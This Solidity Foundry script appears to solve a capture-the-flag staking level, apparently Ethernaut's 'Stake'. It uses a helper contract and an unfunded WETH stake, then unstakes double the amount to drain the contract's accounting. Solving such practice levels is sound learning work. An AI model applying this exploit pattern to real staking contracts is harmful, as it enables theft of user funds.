// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {BaseTest} from "test/utils/BaseScript.s.sol";
import {console2} from "forge-std/console2.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface Stake {
    function WETH() external returns(address);
    function totalStaked() external returns(uint256);
    function UserStake(address) external returns(uint256);
    function Stakers(address) external returns(bool);

    function StakeETH() payable external;
    function StakeWETH(uint256) payable external returns(bool);
    function Unstake(uint256) external returns(bool);
}

contract StakeAttack {
    address internal owner;
    Stake internal instance;

    constructor(address contractAddress) {
        owner = msg.sender;
        instance = Stake(contractAddress);
    }

    receive() external payable {}

    fallback() external payable {
    }

    function attack() payable external {
        instance.StakeETH{value: msg.value}();
    }
}

contract StakeTest is BaseTest {
    function run() public {
        contractAddress = 0x449bB8a111bFe11Bd05135AF0389E221DA77c48a; // your instance
        Stake instance = Stake(contractAddress);

        address WETH = instance.WETH();
        uint256 amount = 0.001 ether + 1 wei; 

        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);
        StakeAttack helper = new StakeAttack(contractAddress);
        helper.attack{value: amount + 1 wei}();

        instance.StakeETH{value: amount}();

        IERC20(WETH).approve(address(instance), amount);
        instance.StakeWETH(amount);

        instance.Unstake(amount*2);

        vm.stopBroadcast();

        assert(contractAddress.balance > 0);
        assert(Stake(contractAddress).totalStaked() > contractAddress.balance);
        assert(Stake(contractAddress).UserStake(deployer) == 0);
        assert(Stake(contractAddress).Stakers(deployer) == true);
    }
}


